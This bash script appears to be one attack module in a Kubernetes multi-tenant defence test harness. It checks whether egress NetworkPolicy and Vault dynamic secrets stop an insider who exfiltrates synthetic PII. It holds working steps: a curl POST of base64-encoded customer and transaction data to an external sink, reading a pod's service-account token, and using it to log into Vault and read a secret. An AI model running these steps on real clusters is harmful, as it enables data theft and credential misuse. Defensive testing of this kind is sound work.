#!/usr/bin/env bash
# =============================================================================
# ATTACK A7 — Data Exfiltration
# Doc class : A7  |  Script: attack7.sh
# Spec      : Rev6 Section 13 (A7 scope constraint — origin, CORRECTED)
# Objective : exfiltrate tenant data or steal Vault-issued dynamic secrets
#
# Techniques (spec-aligned, with implementable substitute where noted):
#   T1 — Direct Egress        tenant-finserv pod streams REAL mock PII +
#                              transaction-record data (Tenants/
#                              finserv-data.yaml — a PVC seeded with 20
#                              synthetic customer records + 200 synthetic
#                              transactions, brief Section 13) to an
#                              external endpoint via outbound connection.
#                              REVISION 6 UPDATE: previously a hardcoded
#                              "stolen=data" placeholder string with no
#                              actual dataset behind it — now exfiltrates
#                              genuine (synthetic) file content. Falls back
#                              to the old placeholder, logged explicitly as
#                              a degraded path, only if the PVC isn't found
#                              (e.g. a cluster whose Tenants/deploy.sh ran
#                              before finserv-data.yaml existed).
#   T2 — Vault Secret Theft   a stolen SA token AND a genuinely-fetched
#                              SPIFFE SVID (via the SPIRE Workload API,
#                              Controls/c7-vault Part 2) belonging to the
#                              finserv workload are used to request that
#                              workload's own short-lived Vault secret.
#                              REVISION 6 UPDATE: SPIRE server+agent are now
#                              deployed (see Driver/constants.py's
#                              L7_SCOPE_NOTE) — the SVID fetched below is
#                              real, not a placeholder. Vault's own login
#                              step is still SA-token-based (documented
#                              residual limitation, same note); the SVID
#                              fetch demonstrates genuine SPIFFE identity
#                              issuance/retrieval independent of that.
#
# REVISION 6 CORRECTION (origin, this file): A7's attacker origin is
# tenant-finserv, NOT tenant-lowpriv (an earlier value) or tenant-saas (a
# plausible misreading of the "burst load" row). Both techniques are
# anchored in the finserv workload itself — this attack does NOT cross a
# namespace boundary. ATTACKER_NS and VICTIM_NS are therefore the SAME
# namespace (tenant-finserv) by default; there is no cross-tenant pivot
# anywhere in this script. This models an insider / already-present
# principal — e.g. a compromised co-located process or a credential that
# leaked out of the finserv workload's own pod — not an external intruder
# probing in from another tenant. (Like A6, origin==target; unlike A6, the
# shared namespace is tenant-finserv, not tenant-lowpriv.)
#
# What this means for T2 specifically: because attacker and victim are the
# same namespace, the Vault Kubernetes-auth role legitimately matches the
# attacker's SA — a login succeeding here is NOT a role-binding bypass (the
# binding IS correct for this principal). What the technique demonstrates is
# that L7's dynamic-secret mechanism does not, by itself, prevent an insider
# who already holds the workload's own SA token from pulling that workload's
# secret — L7's value is bounding the exposure window (short TTL) if that
# token/secret later leaks further, not blocking same-namespace access. This
# is an intentional, documented modeling choice consistent with the brief's
# "insider/already-present principal" framing, not a task left over from the
# pre-correction cross-tenant version of this script.
#
# Primary defenders:
#   T1 → L5 (NetworkPolicy egress filtering blocks the outbound POST)
#   T2 → L7 (Vault Kubernetes-auth dynamic secret; success demonstrates the
#            insider-access limitation above rather than a broken binding)
#
# Output: SUCCESS|<technique>|<detail>
#         BLOCKED|<technique>|<detail>
#         SKIP|<reason>
# =============================================================================
set -euo pipefail

ATTACKER_NS="${ATTACKER_NS:-tenant-finserv}"
VICTIM_NS="${VICTIM_NS:-tenant-finserv}"
EXFIL_SINK="${EXFIL_SINK:-http://example.com}"
SEED="${SEED:-$$}"

succeed() { echo "SUCCESS|$1|$2"; exit 0; }
blocked() { echo "BLOCKED|$1|$2"; exit 1; }
skip()    { echo "SKIP|$1";       exit 2; }

TECHNIQUES=(t1-direct-egress t2-vault-sa-token-exfil)
N_TECH=${#TECHNIQUES[@]}
: "${TECHNIQUE_IDX:?TECHNIQUE_IDX env var required}"
[[ "$TECHNIQUE_IDX" -lt 0 || "$TECHNIQUE_IDX" -ge "$N_TECH" ]] && {
  echo "SKIP|TECHNIQUE_IDX-out-of-range-$TECHNIQUE_IDX"; exit 2; }
TECHNIQUE="${TECHNIQUES[$TECHNIQUE_IDX]}"
echo "[A7] SEED=$SEED TECHNIQUE_IDX=$TECHNIQUE_IDX technique=$TECHNIQUE"
echo "[A7] attacker_ns=$ATTACKER_NS victim_ns=$VICTIM_NS (same namespace — insider model, no namespace crossing)"

ATTACKER_POD=$(kubectl get pod -n "$ATTACKER_NS" -l app=client \
  --field-selector=status.phase=Running \
  -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)

case "$TECHNIQUE" in

  t1-direct-egress)
    [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"
    echo "[A7-t1] data egress — POST mock PII/transaction data to external sink $EXFIL_SINK"

    HAS_DATA=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c '[ -f /data/finserv/customers.json ] && [ -f /data/finserv/transactions.csv ] && echo yes || echo no' \
      2>/dev/null || echo "no")

    if [[ "$HAS_DATA" == "yes" ]]; then
      # Real dataset present (Tenants/finserv-data.yaml, applied by
      # Tenants/deploy.sh) — exfiltrate actual mock PII/transaction content,
      # not a placeholder string. Sampled (all 20 customers + first 50
      # transaction rows, not the full 200) to keep the exec'd curl command
      # line a reasonable size. The read (kubectl exec cat) and the base64
      # encoding both happen via/on the driver host, NOT inside the pod —
      # that's just data retrieval over the Kubernetes API and isn't what
      # this technique is testing. The actual attack vector (and the only
      # step L5's NetworkPolicy can see or block) is the curl POST below,
      # which runs from inside the attacker pod itself.
      echo "[A7-t1] real mock PII/transaction PVC present — exfiltrating actual content"
      RECORD_COUNT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
        sh -c 'tail -n +2 /data/finserv/transactions.csv | wc -l' 2>/dev/null || echo "0")
      PAYLOAD_B64=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
        sh -c 'cat /data/finserv/customers.json; head -51 /data/finserv/transactions.csv' 2>/dev/null \
        | base64 | tr -d '\n')
      [[ -z "$PAYLOAD_B64" ]] && skip "finserv-data-present-but-unreadable"
      EGRESS_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
        sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 8 \
          -X POST --data-urlencode tenant='${VICTIM_NS}' \
          --data-urlencode payload_b64='${PAYLOAD_B64}' \
          '${EXFIL_SINK}' 2>/dev/null" 2>/dev/null || echo "000")
      DETAIL="http${EGRESS_OUT} egress-reached-sink real-mock-pii-exfiltrated total-txn-records=${RECORD_COUNT}"
    else
      # Fallback for a cluster whose Tenants/deploy.sh ran before
      # finserv-data.yaml existed — still functional, but logged clearly as
      # a degraded path rather than silently indistinguishable from the
      # real-data path above.
      echo "[A7-t1] (fallback) mock-data PVC not found — re-run Tenants/deploy.sh to provision it"
      echo "[A7-t1]   (Tenants/finserv-data.yaml) — using placeholder payload for this trial"
      EGRESS_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
        sh -c "curl -s -o /dev/null -w '%{http_code}' --max-time 8 \
          -X POST -d 'stolen=data&tenant=${VICTIM_NS}' \
          '${EXFIL_SINK}' 2>/dev/null" 2>/dev/null || echo "000")
      DETAIL="http${EGRESS_OUT} egress-reached-sink FALLBACK-placeholder-payload-no-pvc"
    fi
    echo "[A7-t1] egress HTTP: $EGRESS_OUT"
    # Any HTTP response (>=100) means TCP egress reached the sink.
    # 000 means NetworkPolicy dropped the packet before TCP handshake.
    [[ "$EGRESS_OUT" =~ ^[1-9][0-9][0-9]$ ]] \
      && succeed "t1-direct-egress" "$DETAIL" \
      || blocked "t1-direct-egress" "netpol-blocked http=$EGRESS_OUT"
    ;;

  t2-vault-sa-token-exfil)
    echo "[A7-t2] insider SA token -> Vault Kubernetes auth -> own dynamic secret exfil"
    VAULT_NS="vault"
    VAULT_POD=$(kubectl get pod -n "$VAULT_NS" -l app.kubernetes.io/name=vault \
      --field-selector=status.phase=Running \
      -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
    [[ -z "$VAULT_POD" ]] && skip "no-vault-pod-path-not-populated-before-C7"
    [[ -z "$ATTACKER_POD" ]] && skip "no-attacker-pod-in-$ATTACKER_NS"

    # --- SPIFFE SVID fetch (new) -------------------------------------------
    # Demonstrates genuine SPIFFE identity retrieval, independent of the
    # SA-token path below. Only runs if c7-vault Part 2 mounted the Workload
    # API socket into this pod (it won't be present below C7, or if SPIRE
    # isn't deployed) — SKIPs gracefully otherwise rather than failing the
    # whole technique, since T2's pass/fail verdict is still decided by the
    # Vault login below.
    SPIRE_SOCKET="/run/spire/sockets"
    HAS_SOCKET=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      sh -c "[ -S ${SPIRE_SOCKET}/api.sock ] && echo yes || echo no" 2>/dev/null || echo "no")
    if [[ "$HAS_SOCKET" == "yes" ]]; then
      echo "[A7-t2] Workload API socket present — fetching spire-agent CLI into attacker pod"
      SPIRE_AGENT_POD=$(kubectl get pod -n spire -l app.kubernetes.io/name=agent \
        --field-selector=status.phase=Running \
        -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)
      if [[ -n "$SPIRE_AGENT_POD" ]]; then
        kubectl cp "spire/${SPIRE_AGENT_POD}:/opt/spire/bin/spire-agent" \
          /tmp/spire-agent-cli 2>/dev/null || true
        if [[ -f /tmp/spire-agent-cli ]]; then
          kubectl cp /tmp/spire-agent-cli "${ATTACKER_NS}/${ATTACKER_POD}:/tmp/spire-agent" 2>/dev/null || true
          kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- chmod +x /tmp/spire-agent 2>/dev/null || true
          SVID_OUT=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
            /tmp/spire-agent api fetch x509 -socketPath "${SPIRE_SOCKET}/api.sock" 2>&1 || true)
          echo "[A7-t2] SVID fetch result: $(echo "$SVID_OUT" | head -c 200)"
          if echo "$SVID_OUT" | grep -qi "spiffe://"; then
            echo "[A7-t2] genuine SPIFFE SVID retrieved by insider (finserv workload identity)"
          fi
        else
          echo "[A7-t2] (skip) could not copy spire-agent CLI out of $SPIRE_AGENT_POD"
        fi
      else
        echo "[A7-t2] (skip) no running spire-agent pod found"
      fi
    else
      echo "[A7-t2] (skip) Workload API socket not mounted in this pod (below C7 or SPIRE not applied)"
    fi
    # --- end SPIFFE SVID fetch ----------------------------------------------

    ATTACKER_TOKEN=$(kubectl exec -n "$ATTACKER_NS" "$ATTACKER_POD" -- \
      cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null || true)
    [[ -z "$ATTACKER_TOKEN" ]] && skip "no-attacker-token"

    # The tenant-finserv role (auth/kubernetes/role/tenant-finserv) is bound
    # to tenant-finserv:default — the SAME namespace/SA the attacker pod
    # runs as, per the corrected insider/same-namespace origin above. This
    # login is expected to succeed if the pod holds a valid finserv SA
    # token; that is the point being tested (see header note), not a
    # cross-tenant role-binding bypass.
    echo "[A7-t2] attempting Vault k8s-auth login as $ATTACKER_NS:default via role=tenant-finserv"
    LOGIN_OUT=$(kubectl exec -n "$VAULT_NS" "$VAULT_POD" -- sh -c \
      "VAULT_ADDR=http://127.0.0.1:8200 vault write -format=json auth/kubernetes/login \
       role=tenant-finserv jwt=$ATTACKER_TOKEN" 2>&1 || echo "LOGIN_FAILED")
    echo "[A7-t2] login response: $(echo "$LOGIN_OUT" | head -c 200)"

    CLIENT_TOKEN=$(echo "$LOGIN_OUT" | grep -o '"client_token":"[^"]*"' | head -1 | cut -d'"' -f4 || true)

    if [[ -z "$CLIENT_TOKEN" ]]; then
      blocked "t2-vault-sa-token-exfil" "vault-k8s-auth-login-denied"
    fi

    echo "[A7-t2] login accepted — reading dynamic secret with issued client token"
    SECRET_READ=$(kubectl exec -n "$VAULT_NS" "$VAULT_POD" -- sh -c \
      "VAULT_ADDR=http://127.0.0.1:8200 VAULT_TOKEN=$CLIENT_TOKEN \
       vault kv get -field=value secret/tenant-finserv/apikey" 2>/dev/null || echo "")

    [[ -n "$SECRET_READ" ]] \
      && succeed "t2-vault-sa-token-exfil" "dynamic-secret-read via-insider-sa-token same-namespace-access" \
      || blocked "t2-vault-sa-token-exfil" "login-accepted-but-secret-read-denied"
    ;;

  *)
    skip "unknown-technique-$TECHNIQUE"
    ;;
esac
